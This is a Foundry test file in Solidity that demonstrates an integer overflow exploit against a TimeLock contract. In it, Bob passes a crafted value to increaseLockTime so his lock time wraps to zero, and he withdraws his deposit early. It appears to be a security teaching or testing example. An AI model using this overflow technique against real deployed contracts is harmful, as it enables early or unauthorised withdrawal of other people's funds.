// SPDX-License-Identifier: MIT
pragma solidity 0.7.0;

import {Test, console} from "forge-std/Test.sol";
import {TimeLock} from "../src/TimeLock.sol";

contract TimeLockTest is Test {
    TimeLock timeLock;
    address alice = makeAddr("alice");
    address bob = makeAddr("bob");

    function setUp() external {
        timeLock = new TimeLock();
    }

    // The testOverflow function, used to test for overflow vulnerabilities.
    function testOverflow() public {
        // Log Alice's balance.
        console.log("Alice balance", alice.balance);
        // Log Bob's balance.
        console.log("Bob balance", bob.balance);

        // Log the start of Alice's deposit.
        console.log("Alice deposit 1 Ether...");
        // Set the message sender to Alice.
        vm.prank(alice);
        // Alice deposits 1 ether to the TimeLock contract.
        timeLock.deposit{value: 1 ether}();
        // Log Alice's new balance.
        console.log("Alice balance", alice.balance);

        // Log the start of Bob's deposit.
        console.log("Bob deposit 1 Ether...");
        // Set the message sender to Bob.
        vm.startPrank(bob);
        // Bob deposits 1 ether to the TimeLock contract.
        timeLock.deposit{value: 1 ether}();
        // Log Bob's new balance.
        console.log("Bob balance", bob.balance);

        // Exploit: Increase the lock time so it overflows and becomes 0.
        timeLock.increaseLockTime(type(uint256).max + 1 - timeLock.lockTime(bob));

        // Log that Bob can now withdraw his funds because the lock time has overflowed.
        console.log("Bob will successfully withdraw, because the lock time is overflowed");
        // Bob withdraws his funds.
        timeLock.withdraw();
        // Log Bob's new balance.
        console.log("Bob balance", bob.balance);
        // Stop Bob's prank.
        vm.stopPrank();

        // Start Alice's prank.
        vm.prank(alice);
        // Log that Alice can't withdraw her funds because the lock time has not expired.
        console.log("Alice will fail to withdraw, because the lock time did not expire");
        // Try to withdraw Alice's funds. This should revert because the lock time has not expired.
        timeLock.withdraw(); // expect revert
    }
}
